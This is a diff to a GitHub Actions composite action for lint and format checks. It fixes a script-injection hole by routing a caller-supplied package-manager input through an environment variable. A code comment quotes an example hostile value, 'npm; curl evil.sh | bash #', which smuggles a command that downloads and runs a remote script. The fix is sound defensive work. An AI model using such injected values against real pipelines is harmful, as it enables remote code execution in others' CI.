@@ -18,11 +18,23 @@ inputs:
 runs:
   using: composite
   steps:
+    # Both steps route `inputs.package-manager` through an env var
+    # instead of `${{ … }}` interpolation directly in `run:`. GitHub
+    # Actions expands `${{ … }}` BEFORE the shell sees the command line,
+    # so a caller-supplied value like `npm; curl evil.sh | bash #` would
+    # execute injected commands in the caller's CI context. Passing the
+    # value through `env:` and quoting `"$PM"` keeps it a single argv
+    # token regardless of contents. Same pattern as
+    # reusable-node-ci.yml's Build / Test steps.
     - name: ESLint
       shell: bash
-      run: ${{ inputs.package-manager }} run lint
+      env:
+        PM: ${{ inputs.package-manager }}
+      run: '"$PM" run lint'
 
     - name: Prettier (check)
       if: inputs.run-format-check == 'true'
       shell: bash
-      run: ${{ inputs.package-manager }} run format:check
+      env:
+        PM: ${{ inputs.package-manager }}
+      run: '"$PM" run format:check'
